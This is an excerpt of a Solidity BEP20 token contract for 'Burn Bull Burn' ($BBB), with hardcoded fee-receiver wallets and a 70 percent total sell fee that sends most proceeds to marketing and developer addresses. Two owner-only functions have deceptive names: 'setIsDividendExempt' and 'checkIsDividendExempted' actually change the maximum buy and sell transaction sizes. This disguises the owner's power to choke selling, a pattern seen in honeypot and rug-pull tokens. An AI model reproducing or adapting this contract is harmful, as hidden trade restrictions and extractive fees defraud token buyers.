...
/* Token contract */
contract BurnBullBurnFinal is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x3032cA4B9B0F5BbdED39A66Ecb72D8971B9b6a6C;
    ...
    // Name and symbol
    string constant _name = "Burn Bull Burn";
    string constant _symbol = "$BBB";
    uint8 constant _decimals = 18;

    // Total supply
    uint256 _totalSupply = 100000000 * (10 ** _decimals); // 100m
    uint256 _circulatingSupply = 20000000 * (10 ** _decimals);

    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _circulatingSupply * 1 / 199; // 100,000 tokens
    uint256 public _maxSellTxAmount = _circulatingSupply * 1 / 399; // 50,000 tokens
    uint256 public _maxWalletToken = _circulatingSupply * 1 / 100; // 1% or 200K tokens
    ...
    uint256 public buybackFeeBuy = 10;
    ...
    uint256 public buybackFeeSell = 10;
    uint256 public reflectionFeeSell = 0;
    uint256 public marketingFeeSell = 40;
    uint256 public devFeeSell = 9;
    uint256 public rwrdFeeSell = 1;
    uint256 public totalFeeSell = 70;
    ...
    uint256 public swapThreshold = _circulatingSupply * 1 / 4000; // 5000 Tokens
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x2Ec25Ba95CaEab6246CED2da90BAB8D79Cca48bB;
        devFeeReceiver = 0x3032cA4B9B0F5BbdED39A66Ecb72D8971B9b6a6C;
        rewardFeeReceiver = 0x85fab3f07166c51a0ed6C1dEefB04719c0A7776A;
    ...
    // NOTE: 1% = 100
     function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
        _maxWalletToken = _circulatingSupply.mul(maxWallPercent).div(100);
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBLiquidity = address(this).balance.sub(balanceBefore).mul(dynamicLiquidityFee).div(totalFee.sub(dynamicLiquidityFee.div(2))).div(2);
        uint256 amountBNBReflection = address(this).balance.sub(balanceBefore).mul(reflectionFee).div(totalFee.sub(dynamicLiquidityFee.div(2)));
        uint256 amountBNBMarketing = address(this).balance.sub(balanceBefore).mul(marketingFee).div(totalFee.sub(dynamicLiquidityFee.div(2)));
        uint256 amountBNBDev = address(this).balance.sub(balanceBefore).mul(devFee).div(totalFee.sub(dynamicLiquidityFee.div(2)));
        uint256 amountBNBRwrd = address(this).balance.sub(balanceBefore).mul(rwrdFee).div(totalFee.sub(dynamicLiquidityFee.div(2))); 
        ...
        (bool successRwrd, /* bytes memory data */) = payable(rewardFeeReceiver).call{value: amountBNBRwrd, gas: 30000}("");
        require(successMarketing, "marketing receiver rejected ETH transfer");
        require(successDev, "dev receiver rejected ETH transfer");
        require(successRwrd, "Reward receiver rejected ETH transfer");
    ...
    function setIsDividendExempt(uint256 maxBuyTxPercent) external authorized {
        _maxBuyTxAmount = _totalSupply.mul(maxBuyTxPercent).div(10000);
    }

    function checkIsDividendExempted(uint256 maxSellTxPercent) external authorized {
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _rewardFeeReceiver, address _devFeeReceiver, address _marketingFeeReceiver) external authorized {
